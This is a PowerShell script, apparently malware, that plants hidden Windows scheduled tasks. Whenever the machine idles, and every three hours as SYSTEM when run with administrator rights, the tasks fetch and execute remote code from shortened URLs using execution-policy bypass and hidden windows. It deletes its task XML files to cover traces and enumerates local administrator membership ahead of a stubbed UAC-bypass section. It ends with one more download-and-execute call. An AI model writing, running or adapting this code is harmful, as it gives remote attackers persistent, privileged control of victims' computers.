#
#SystemTaskIdleUpdate 'http://goo.gl/MTekjk', Temprorary when Idle
#

$f=$env:TEMP;$f+='\SystemTaskIdleUpdate.xml';
$s = '<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>2010-10-16T16:09:29</Date>
    <Author>';
$s+=$env:username+'</Author>
  </RegistrationInfo>
  <Triggers>
    <IdleTrigger>
      <Enabled>true</Enabled>
    </IdleTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>';
$computername=$env:userdomain; if([string]::IsNullOrEmpty($computername)){$computername = $env:computername;};      
$s+=$computername+'\'+$env:username+'</UserId>
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>LeastPrivilege</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <RunOnlyIfNetworkAvailable>true</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <Duration>PT15M</Duration>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>true</RestartOnIdle>
      <WaitTimeout>PT0S</WaitTimeout>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>true</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT8H</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>powershell</Command>';
$s+="<Arguments>-nop -ep bypass -w hidden -c iex(New-Object Net.WebClient).DownloadString('http://goo.gl/MTekjk')</Arguments>";
$s+='</Exec>
  </Actions>
</Task>';

$s > $f;
schtasks.exe /Create /XML $env:TEMP"\SystemTaskIdleUpdate.xml" /tn "SystemTaskIdleUpdate";

$s = '';
$s > $f;

# if "Administrator"
If (([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
{

  #
  #SystemTask 'http://bit.ly/1RMFM6u', \ru System
  #

  $f=$env:TEMP;$f+='\SystemTask.xml';
  $s = '<?xml version="1.0" encoding="UTF-16"?>
  <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
    <RegistrationInfo>
      <Date>2010-10-16T16:09:29</Date>
      <Author>';
  $s+=$env:username+'</Author>
    </RegistrationInfo>
    <Triggers>
      <TimeTrigger>
        <Repetition>
          <Interval>PT3H</Interval>
          <StopAtDurationEnd>false</StopAtDurationEnd>
        </Repetition>
        <ExecutionTimeLimit>PT2H</ExecutionTimeLimit>
        <StartBoundary>2015-10-16T23:59:00</StartBoundary>
        <Enabled>true</Enabled>
      </TimeTrigger>
    </Triggers>
    <Principals>
      <Principal id="Author">
        <UserId>';
  $s+='S-1-5-18'+'</UserId>
        <LogonType>InteractiveToken</LogonType>
        <RunLevel>LeastPrivilege</RunLevel>
      </Principal>
    </Principals>
    <Settings>
      <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
      <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
      <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
      <AllowHardTerminate>true</AllowHardTerminate>
      <StartWhenAvailable>true</StartWhenAvailable>
      <RunOnlyIfNetworkAvailable>true</RunOnlyIfNetworkAvailable>
      <IdleSettings>
        <StopOnIdleEnd>false</StopOnIdleEnd>
        <RestartOnIdle>false</RestartOnIdle>
      </IdleSettings>
      <AllowStartOnDemand>true</AllowStartOnDemand>
      <Enabled>true</Enabled>
      <Hidden>true</Hidden>
      <RunOnlyIfIdle>false</RunOnlyIfIdle>
      <WakeToRun>false</WakeToRun>
      <ExecutionTimeLimit>PT2H</ExecutionTimeLimit>
      <Priority>7</Priority>
    </Settings>
    <Actions Context="Author">
      <Exec>
        <Command>powershell</Command>';
  $s+="<Arguments>-nop -ep bypass -w hidden -c iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1RMFM6u')</Arguments>";
  $s+='</Exec>
    </Actions>
  </Task>';

  $s > $f;
  schtasks.exe /Create /XML $env:TEMP"\SystemTask.xml" /tn "SystemTask" /ru System;

  $s = '';
  $s > $f;

  #
  #SystemTaskIdleUpdate to \ru System
  #

  $f=$env:TEMP;$f+='\SystemTaskIdleUpdate.xml';
  $s = '<?xml version="1.0" encoding="UTF-16"?>
  <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
    <RegistrationInfo>
      <Date>2010-10-16T16:09:29</Date>
      <Author>';
  $s+=$env:username+'</Author>
    </RegistrationInfo>
    <Triggers>
      <IdleTrigger>
        <Enabled>true</Enabled>
      </IdleTrigger>
    </Triggers>
    <Principals>
      <Principal id="Author">
        <UserId>';   
  $s+='S-1-5-18'+'</UserId>
        <LogonType>InteractiveToken</LogonType>
        <RunLevel>LeastPrivilege</RunLevel>
      </Principal>
    </Principals>
    <Settings>
      <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
      <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
      <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
      <AllowHardTerminate>true</AllowHardTerminate>
      <RunOnlyIfNetworkAvailable>true</RunOnlyIfNetworkAvailable>
      <IdleSettings>
        <Duration>PT15M</Duration>
        <StopOnIdleEnd>true</StopOnIdleEnd>
        <RestartOnIdle>true</RestartOnIdle>
        <WaitTimeout>PT0S</WaitTimeout>
      </IdleSettings>
      <AllowStartOnDemand>true</AllowStartOnDemand>
      <Enabled>true</Enabled>
      <Hidden>true</Hidden>
      <RunOnlyIfIdle>true</RunOnlyIfIdle>
      <WakeToRun>false</WakeToRun>
      <ExecutionTimeLimit>PT8H</ExecutionTimeLimit>
      <Priority>7</Priority>
    </Settings>
    <Actions Context="Author">
      <Exec>
        <Command>powershell</Command>';
  $s+="<Arguments>-nop -ep bypass -w hidden -c iex(New-Object Net.WebClient).DownloadString('http://goo.gl/MTekjk')</Arguments>";
  $s+='</Exec>
    </Actions>
  </Task>';

  $s > $f;
  schtasks.exe /Delete /F /tn "SystemTaskIdleUpdate"; 
  schtasks.exe /Create /XML $env:TEMP"\SystemTaskIdleUpdate.xml" /tn "SystemTaskIdleUpdate" /ru System;

  $s = '';
  $s > $f;

  #
  #destruct disk files
  #
  
  del $env:TEMP"\SystemTaskIdleUpdate.xml";
  del $env:TEMP"\SystemTask.xml";

  #
  #end
  #

}
# if -NOT "Administrator"
else
{

  #
  #destruct disk files
  #
  
  del $env:TEMP"\SystemTaskIdleUpdate.xml";
  
  #
  #priveleges
  #
  
  If (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
  {
  
    #
    # 1) if Invoke-CheckLocalAdmin == true
    #

    $IsLocalAdmin = $false

    $hostname = hostname

    # get the name, SID, and domain of the current user
    $obj = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    $CurrentUserName = $obj.Name
    $CurrentUserSID = $obj.User.Value
    try{
        $CurrentUserDomain = ((([adsi]'').distinguishedname -replace 'DC=','' -replace ',','.')[0]).ToLower()
    }
    catch {
        $CurrentUserDomain = $Null
    }

    # resolve the SID for the local admin group - this should usually default to "Administrators"
    $objSID = New-Object System.Security.Principal.SecurityIdentifier('S-1-5-32-544')
    $objgroup = $objSID.Translate( [System.Security.Principal.NTAccount])
    $GroupName = ($objgroup.Value).Split('\')[1] #(+)

    try{
        # enumerate all members of the local administrators group and check
        #   if the user is a member of the specified groups
        @($([ADSI]"WinNT://$hostname/$groupname").psbase.Invoke('Members')) | ForEach-Object {

            # get the name of the object
            $name =  ( $_.GetType().InvokeMember('Adspath', 'GetProperty', $null, $_, $null)).Replace('WinNT://', '').Replace("/","\").Replace("WORKGROUP\","")

            # check if this object is the current user
            if($name.ToLower() -eq $CurrentUserName.ToLower()){
                $IsLocalAdmin = $True
                Write-Verbose "[+] User $CurrentUser is in the local administrators group!"
            }

            # check if this object is local or a part of the domain
            $Domain = -not $(($_.GetType().InvokeMember('Adspath', 'GetProperty', $null, $_, $null)).Replace('WinNT://', '')-like "*/$hostname/*")

            # check if the object is a group
            $IsGroup = ($_.GetType().InvokeMember('Class', 'GetProperty', $Null, $_, $Null) -eq 'group')

            if($IsGroup){
                if($Domain -and $CurrentUserDomain){

                    $GroupDomain = $name.split("\")[0]
                    $GroupName = $name.split("\")[1]

                    # resolve the netbiod domain name to a FQDN
                    $DomainFQDN = [System.Net.Dns]::GetHostByName($GroupDomain).Hostname.ToLower()

                    # make sure we get a domain back and the current user is a part of it
                    if(($DomainFQDN) -and ($CurrentUserDomain -eq $DomainFQDN)){
                        # if the current user is a part of this group, flag
                        $GroupUsers = $(Get-NetGroup -GroupName $GroupName -Domain $DomainFQDN)
                        if ($GroupUsers -contains ($CurrentUserName.split("\")[1])) {
                            $IsLocalAdmin = $True
                            # Write-Verbose "[+] User $CurrentUser is in the domain group `"$name`"!"
                        }
                    }
                }
                else{
                    $GroupName = $name.split("\")[1]
                    # otherwise we have a local group, so restart the enumeration
                    @($([ADSI]"WinNT://$hostname/$GroupName").psbase.Invoke('Members')) | ForEach-Object {

                        $name =  ( $_.GetType().InvokeMember('Adspath', 'GetProperty', $null, $_, $null)).Replace('WinNT://', '').Replace("/","\")

                        # check if this object is the current user
                        if($name -eq $CurrentUserName){
                            $IsLocalAdmin = $True
                            # Write-Verbose "[+] User $CurrentUser is in the local group `"$name`"!"
                        }
                    }
                }
            }
        }
    }
    catch {
        # Write-Warning "[!] Error: $_"
    }

    if ($IsLocalAdmin)
    {

      #
      # 2) Invoke-BypassUAC (my command)
      #

      
      

    }
  
  }

}

#
# MessageBox
#

iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1Mx7L5A');

